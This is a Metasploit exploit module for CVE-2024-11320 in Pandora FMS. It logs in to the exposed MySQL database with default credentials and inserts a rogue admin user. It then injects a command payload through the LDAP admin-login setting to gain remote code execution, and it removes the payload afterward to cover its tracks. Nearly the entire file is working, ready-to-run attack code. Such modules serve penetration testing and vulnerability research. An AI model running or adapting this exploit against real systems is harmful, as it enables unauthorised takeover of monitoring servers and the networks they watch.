##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/mysql/client'
require 'digest/md5'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include BCrypt
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  # @!attribute [rw] mysql_client
  # @return [::Rex::Proto::MySQL::Client]
  attr_accessor :mysql_client

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Pandora FMS authenticated command injection leading to RCE via LDAP using default DB password',
        'Description' => %q{
          Pandora FMS is a monitoring solution that provides full observability for your organization's
          technology. This module exploits an command injection vulnerability in the LDAP authentication
          mechanism of Pandora FMS.
          You need have admin access at the Pandora FMS Web application in order to execute this RCE.
          This access can be achieved leveraging a default password vulnerability in Pandora FMS that
          allows an attacker to access the Pandora FMS MySQL database, create a new admin user and gain
          administrative access to the Pandora FMS Web application. This attack can be remotely executed
          over the WAN as long as the MySQL services are exposed to the outside world.
          This issue affects Community, Free and Enterprise editions: from v7.0NG.718 through <= v7.0NG.777.4
        },
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Metasploit module & default password weakness
          'Askar mhaskar', # POC Github CVE-2024-11320
        ],
        'References' => [
          ['CVE', '2024-11320'],
          ['URL', 'https://pandorafms.com/en/security/common-vulnerabilities-and-exposures/'],
          ['URL', 'https://attackerkb.com/topics/CsDUaLijbT/cve-2024-11320']
        ],
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux', 'php'],
        'Privileged' => false,
        'Arch' => [ARCH_CMD, ARCH_PHP],
        'Targets' => [
          [
            'PHP Command',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP,
              'Type' => :php_cmd
            }
          ],
          [
            'Unix/Linux Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2024-11-21',
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 443
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Path to the Pandora FMS application', '/pandora_console']),
      OptString.new('DB_USER', [true, 'Pandora database admin user', 'pandora']),
      OptString.new('DB_PASSWORD', [true, 'Pandora database admin password', 'Pandor4!']),
      OptString.new('DB_NAME', [true, 'Pandora database', 'pandora']),
      OptPort.new('DB_PORT', [true, 'MySQL database port', 3306]),
      OptString.new('USERNAME', [false, 'Pandora web admin user', 'admin']),
      OptString.new('PASSWORD', [false, 'Pandora web admin password', 'pandora'])
    ])
  end

  # MySQL login
  # returns true if successful else false
  def mysql_login(host, user, password, db, port)
    begin
      self.mysql_client = ::Rex::Proto::MySQL::Client.connect(host, user, password, db, port)
    rescue Errno::ECONNREFUSED
      print_error('Connection refused')
      return false
    rescue ::Rex::Proto::MySQL::Client::ClientError
      print_error('Connection timedout')
      return false
    rescue Errno::ETIMEDOUT
      print_error('Operation timedout')
      return false
    rescue ::Rex::Proto::MySQL::Client::HostNotPrivileged
      print_error('Unable to login from this host due to policy')
      return false
    rescue ::Rex::Proto::MySQL::Client::AccessDeniedError
      print_error('Access denied')
      return false
    rescue StandardError => e
      print_error("Unknown error: #{e.message}")
      return false
    end
    true
  end

  # MySQL query
  # returns query result if successful (can be nil) else returns false
  def mysql_query(sql)
    begin
      res = mysql_client.query(sql)
    rescue ::Rex::Proto::MySQL::Client::Error => e
      print_error("MySQL Error: #{e.class} #{e}")
      return false
    rescue Rex::ConnectionTimeout => e
      print_error("Timeout: #{e.message}")
      return false
    rescue StandardError => e
      print_error("Unknown error: #{e.message}")
      return false
    end
    res
  end

  # login at the Pandora FMS web application
  # return true if login successful else false
  def pandora_login(name, pwd)
    # first login GET request to get csrf code
    # in older versions of Pandora FMS this csrf code is not implemented
    # but for the sake of simplicity we still execute this GET request
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'keep_cookies' => true,
      'vars_get' => {
        'login' => 1
      }
    })
    return unless res&.code == 200

    # scrape <input id="hidden-csrf_code" name="csrf_code" type="hidden"  value="d3ec1cae43fba8259079038548093ba8" />
    html = res.get_html_document
    csrf_code_html = html.at('input[@id="hidden-csrf_code"]')
    vprint_status("csrf_code: #{csrf_code_html}")
    csrf_code = csrf_code_html.attribute_nodes[3] unless csrf_code_html.nil? || csrf_code_html.blank?

    # second login POST request using the csrf code
    # csrf_code can be nil in older versions where the csrf_code is not implemented
    res = send_request_cgi!({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'keep_cookies' => true,
      'vars_get' => {
        'login' => 1
      },
      'vars_post' => {
        'nick' => name,
        'pass' => pwd,
        'Login_button' => "Let's go",
        'csrf_code' => csrf_code
      }
    })
    return res&.code == 200 && res.body.include?('id="welcome-icon-header"') || res.body.include?('id="welcome_panel"') || res.body.include?('godmode')
  end

  # CVE-2024-11320: Misconfigure LDAP with RCE payload
  # return true if successful else false
  def configure_ldap(payload)
    # first LDAP GET request to get the csrf_code
    # in older versions of Pandora FMS this csrf code is not implemented
    # but for the sake of simplicity we still execute this GET request
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'keep_cookies' => true,
      'vars_get' => {
        'sec' => 'general',
        'sec2' => 'godmode/setup/setup',
        'section' => 'auth'
      }
    })
    return unless res&.code == 200

    # scrape <input id="hidden-csrf_code" name="csrf_code" type="hidden"  value="d3ec1cae43fba8259079038548093ba8" />
    html = res.get_html_document
    csrf_code_html = html.at('input[@id="hidden-csrf_code"]')
    vprint_status("csrf_code: #{csrf_code_html}")
    csrf_code = csrf_code_html.attribute_nodes[3] unless csrf_code_html.nil? || csrf_code_html.blank?

    # second LDAP POST request using the csrf_code
    # csrf_code can be nil in older versions where the csrf_code is not implemented
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'keep_cookies' => true,
      'vars_get' => {
        'sec' => 'general',
        'sec2' => 'godmode/setup/setup',
        'section' => 'auth'
      },
      'vars_post' => {
        'update_config' => 1,
        'csrf_code' => csrf_code,
        'auth' => 'ldap',
        'fallback_local_auth' => 1,
        'fallback_local_auth_sent' => 1,
        'ldap_server' => 'localhost',
        'ldap_port' => 389,
        'ldap_version' => 3,
        'ldap_start_tls_sent' => 1,
        'ldap_base_dn' => 'ou%3DPeople%2Cdc%3Dedu%2Cdc%3Dexample%2Cdc%3Dorg',
        'ldap_login_attr' => 'uid',
        'ldap_admin_login' => payload,
        'ldap_admin_pass' => nil,
        'ldap_search_timeout' => 0,
        'secondary_ldap_enabled_sent' => 1,
        'ldap_server_secondary' => 'localhost',
        'ldap_port_secondary' => 389,
        'ldap_version_secondary' => 3,
        'ldap_start_tls_secondary_sent' => 1,
        'ldap_base_dn_secondary' => 'ou%3DPeople%2Cdc%3Dedu%2Cdc%3Dexample%2Cdc%3Dorg',
        'ldap_login_attr_secondary' => 'uid',
        'ldap_admin_login_secondary' => nil,
        'ldap_admin_pass_secondary' => nil,
        'double_auth_enabled_sent' => 1,
        '2FA_all_users_sent' => 1,
        'session_timeout' => 90,
        'update_button' => 'Update',
        'ldap_function' => 'local'
      }
    })
    return res&.code == 200
  end

  # CVE-2024-11320: Command Injection leading to RCE via LDAP Misconfiguration
  def execute_command(cmd, _opts = {})
    # modify php payload to trigger the RCE
    payload = "';#{target['Type'] == :php_cmd ? "php -r'#{cmd.gsub(/'/, '"')}'" : cmd} #"

    # misconfigure LDAP settings with RCE payload
    # clear cookies and execute dummy login to trigger the LDAP RCE payload
    if configure_ldap(payload)
      @clean_payload = true
      cookie_jar.clear
      send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'index.php'),
        'vars_get' => {
          'login' => 1
        }
      })
    else
      @clean_payload = false
    end
  end

  def cleanup
    # try to remove the payload from the LDAP settings to cover our tracks
    # but do not run during the check phase
    super
    unless @check_running
      # Disconnect from MySQL server
      mysql_client.close if mysql_client
      # check if payload should be removed
      if @clean_payload
        if pandora_login(@username, @password) && configure_ldap(nil)
          print_good('Payload is successful removed from LDAP configuration.')
          return
        end
        print_warning('Payload could not be removed from LDAP configuration. Try to clean it manually.')
      end
    end
  end

  def check
    @check_running = true
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'keep_cookies' => true
    })
    unless res&.code == 200 && res.body.include?('PandoraFMS.com') || res.body.include?('Pandora FMS')
      return CheckCode::Safe('Target is not a Pandora FMS application.')
    end

    html = res.get_html_document
    full_version = html.at('div[@id="ver_num"]')
    if full_version.blank?
      return CheckCode::Detected('Could not determine the Pandora FMS version.')
    end

    full_version = full_version.text
    version = full_version[1..].sub('NG', '')
    if version.blank?
      return CheckCode::Detected('Could not determine the Pandora FMS version.')
    end

    version = Rex::Version.new(version)
    unless version >= Rex::Version.new('7.0.718') && version <= Rex::Version.new('7.0.777.4')
      return CheckCode::Safe("Pandora FMS version #{full_version}")
    end

    CheckCode::Appears("Pandora FMS version #{full_version}")
  end

  def exploit
    @check_running = false
    # check if we can login at the Pandora Web application with the default admin credentials
    @username = datastore['USERNAME']
    @password = datastore['PASSWORD']
    print_status("Trying to log in with admin credentials #{@username}:#{@password} at the Pandora FMS Web application.")
    unless pandora_login(@username, @password)
      # connect to the PostgreSQL DB with default credentials
      print_status('Logging in with admin credentials failed. Trying to connect to the Pandora MySQL server.')
      mysql_login_res = mysql_login(datastore['RHOSTS'], datastore['DB_USER'], datastore['DB_PASSWORD'], datastore['DB_NAME'], datastore['DB_PORT'])
      fail_with(Failure::Unreachable, "Unable to connect to the MySQL server on port #{datastore['DB_PORT']}.") unless mysql_login_res

      # add a new admin user
      @username = Rex::Text.rand_text_alphanumeric(5..8).downcase
      @password = Rex::Text.rand_password

      # check the password hash algorithm by reading the password hash of the admin user
      # new pandora versions hashes the password in bcrypt $2*$, Blowfish (Unix) format else it is a plain MD5 hash
      mysql_query_res = mysql_query("SELECT password FROM tusuario WHERE id_user = 'admin';")
      fail_with(Failure::BadConfig, 'Cannot find admin credentials to determine password hash algorithm.') if mysql_query_res == false || mysql_query_res.size != 1
      hash = mysql_query_res.fetch_hash
      if hash['password'].match(/^\$2.\$/)
        password_hash = Password.create(@password)
      else
        password_hash = Digest::MD5.hexdigest(@password)
      end
      print_status("Creating new admin user with credentials #{@username}:#{@password} for access at the Pandora FMS Web application.")
      mysql_query_res = mysql_query("INSERT INTO tusuario (id_user, password, is_admin) VALUES (\'#{@username}\', \'#{password_hash}\', '1');")
      fail_with(Failure::BadConfig, "Adding new admin credentials #{@username}:#{@password} to the database failed.") if mysql_query_res == false

      # log in with the new admin user credentials at the Pandora FMS Web application
      print_status("Trying to log in with new admin credentials #{@username}:#{@password} at the Pandora FMS Web application.")
      fail_with(Failure::NoAccess, 'Failed to authenticate at the Pandora FMS application.') unless pandora_login(@username, @password)
    end
    print_status('Succesfully authenticated at the Pandora FMS Web application.')

    # storing credentials at the msf database
    print_status('Saving admin credentials at the msf database.')
    store_valid_credential(user: @username, private: @password)

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd, :php_cmd
      execute_command(payload.encoded)
    else
      fail_with(Failure::BadConfig, "Unsupported target type: #{target['Type']}.")
    end
  end
end
